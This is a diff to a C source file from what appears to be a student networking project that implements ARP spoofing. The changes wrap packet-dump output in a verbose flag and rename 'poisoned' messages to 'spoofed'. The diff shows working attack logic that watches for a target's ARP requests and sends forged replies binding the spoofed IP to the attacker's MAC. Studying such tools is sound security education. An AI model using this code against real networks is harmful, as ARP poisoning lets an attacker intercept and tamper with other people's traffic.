@@ -6,7 +6,7 @@
 /*   By: jragot <jragot@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2021/09/15 21:21:21 by jragot            #+#    #+#             */
-/*   Updated: 2021/12/12 05:07:32 by jragot           ###   ########.fr       */
+/*   Updated: 2021/12/13 05:37:51 by jragot           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -76,11 +76,22 @@ void	arp_reply(struct arp_ip *request)
 	unsigned char reply_output[42];
 
 	initialize_device(&device);
-	printf("\e[31m(ARP REQUEST DETECTED FROM %d.%d.%d.%d)\n", request->ar_sip[0], request->ar_sip[1], request->ar_sip[2], request->ar_sip[3]);
+	printf("\e[31mARP REQUEST DETECTED FROM %d.%d.%d.%d (\"Who has %d.%d.%d.%d ?\")\n", 
+	request->ar_sip[0], request->ar_sip[1], request->ar_sip[2], request->ar_sip[3],
+	request->ar_tip[0], request->ar_tip[1], request->ar_tip[2], request->ar_tip[3]);
 	craft_arp(reply_output);
-	printf("------ REPLYING (POISONED): ------\n");
-	process_ethernet(reply_output, 42);
-	printf("------ END OF REPLY: ------\e[0m\n");
+	if (g_project.verbose)
+	{
+		printf("------ REPLYING (SPOOFED): ------\n");
+		process_ethernet(reply_output, 42);
+		printf("------ END OF REPLY ------\e[0m\n");
+	}
+	else
+	{
+		printf("\e[0m\nSending spoofed response (\"%d.%d.%d.%d is at %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\")", 
+		request->ar_tip[0], request->ar_tip[1], request->ar_tip[2], request->ar_tip[3],
+		g_project.addresses.smac[0], g_project.addresses.smac[1], g_project.addresses.smac[2], g_project.addresses.smac[3],g_project.addresses.smac[4], g_project.addresses.smac[5]);
+	}
 	if ((bytes_sent = sendto(g_project.fd, reply_output, sizeof(reply_output), 0, (struct sockaddr *)&device, sizeof(device)) < 0))
 		exit_error("Error sending poisoned response");
 	g_project.waiting_for_reply = 0;
@@ -90,26 +101,29 @@ void	process_arp(unsigned char *buffer)
 {
 	struct arp_ip *arp = (struct arp_ip *)(buffer);
 
-	buffer += sizeof(struct arphdr);
-	printf("\n----ARP PAYLOAD:----\n");
-	printf("|-Sender HW address: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5]);
-	buffer += arp->ar_hln;
-	printf("|-Sender IP address: %d.%d.%d.%d\n", buffer[0], buffer[1], buffer[2], buffer[3]);
-	buffer += arp->ar_pln;
-	printf("|-Target HW address: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5]);
-	buffer += arp->ar_hln;
-	printf("|-Target IP address: %d.%d.%d.%d\n", buffer[0], buffer[1], buffer[2], buffer[3]);
-	buffer += arp->ar_pln;
-	if (arp->ar_op[0] || (arp->ar_op[1] < 1 || arp->ar_op[1] > 2))
-		printf("|-opcode: %.2x (Unknown operation)\n", arp->ar_op[1]);
-	else
-		printf("|-opcode: %.2x %s\n", arp->ar_op[1], (arp->ar_op[1] == 1) ? "(REQUEST)" : "(REPLY)");
+	if (g_project.verbose)
+	{
+		buffer += sizeof(struct arphdr);
+		printf("\n----ARP PAYLOAD:----\n");
+		printf("|-Sender HW address: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5]);
+		buffer += arp->ar_hln;
+		printf("|-Sender IP address: %d.%d.%d.%d\n", buffer[0], buffer[1], buffer[2], buffer[3]);
+		buffer += arp->ar_pln;
+		printf("|-Target HW address: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5]);
+		buffer += arp->ar_hln;
+		printf("|-Target IP address: %d.%d.%d.%d\n", buffer[0], buffer[1], buffer[2], buffer[3]);
+		buffer += arp->ar_pln;
+		if (arp->ar_op[0] || (arp->ar_op[1] < 1 || arp->ar_op[1] > 2))
+			printf("|-opcode: %.2x (Unknown operation)\n", arp->ar_op[1]);
+		else
+			printf("|-opcode: %.2x %s\n", arp->ar_op[1], (arp->ar_op[1] == 1) ? "(REQUEST)" : "(REPLY)");
+		printf("------------------------------------\n\n");
+	}
 	if (arp->ar_op[0] == 0 && arp->ar_op[1] == 1) /* We check if this is an ARP REQUEST */
-		if (memcmp(arp->ar_sip, &g_project.addresses.tip, 4) == 0) /* and if the request is from the target IP... */
-			if (memcmp(arp->ar_sha, &g_project.addresses.tmac, 6) == 0) /* and from the target MAC address */
-				if (memcmp(arp->ar_tip, &g_project.addresses.sip, 4) == 0) /* and if it's about the IP address to spoof */
+		if (ft_memcmp(arp->ar_sip, &g_project.addresses.tip, 4) == 0) /* and if the request is from the target IP... */
+			if (ft_memcmp(arp->ar_sha, &g_project.addresses.tmac, 6) == 0) /* and from the target MAC address */
+				if (ft_memcmp(arp->ar_tip, &g_project.addresses.sip, 4) == 0) /* and if it's about the IP address to spoof */
 						arp_reply(arp);
-	printf("------------------------------------\n\n");
 }
 
 void	process_ethernet(unsigned char *buffer, ssize_t buflen)
@@ -118,13 +132,16 @@ void	process_ethernet(unsigned char *buffer, ssize_t buflen)
 
 	if (ntohs(eth->h_proto) == ETH_P_ARP)
 	{
-		printf("\n*** ARP PACKET ***\nRaw frame:");
-		print_buffer(buffer, buflen); /* Check this before submitting project */
-		printf("(%d bytes read from socket)\n", (unsigned int)buflen);
-		printf("\n----ETHERNET HEADER:----\n");
-		printf("|-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",eth->h_dest[0],eth->h_dest[1],eth->h_dest[2],eth->h_dest[3],eth->h_dest[4],eth->h_dest[5]);
-		printf("|-Source Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",eth->h_source[0],eth->h_source[1],eth->h_source[2],eth->h_source[3],eth->h_source[4],eth->h_source[5]);
-		printf("|-Protocol : %04x\n",ntohs(eth->h_proto));
+		if (g_project.verbose)
+		{
+			printf("\n*** ARP PACKET ***\nRaw frame:");
+			print_buffer(buffer, buflen); /* Check this before submitting project */
+			printf("(%d bytes read from socket)\n", (unsigned int)buflen);
+			printf("\n----ETHERNET HEADER:----\n");
+			printf("|-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",eth->h_dest[0],eth->h_dest[1],eth->h_dest[2],eth->h_dest[3],eth->h_dest[4],eth->h_dest[5]);
+			printf("|-Source Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",eth->h_source[0],eth->h_source[1],eth->h_source[2],eth->h_source[3],eth->h_source[4],eth->h_source[5]);
+			printf("|-Protocol : %04x\n",ntohs(eth->h_proto));
+		}
 		process_arp(buffer+sizeof(struct ethhdr));
 	}
 }
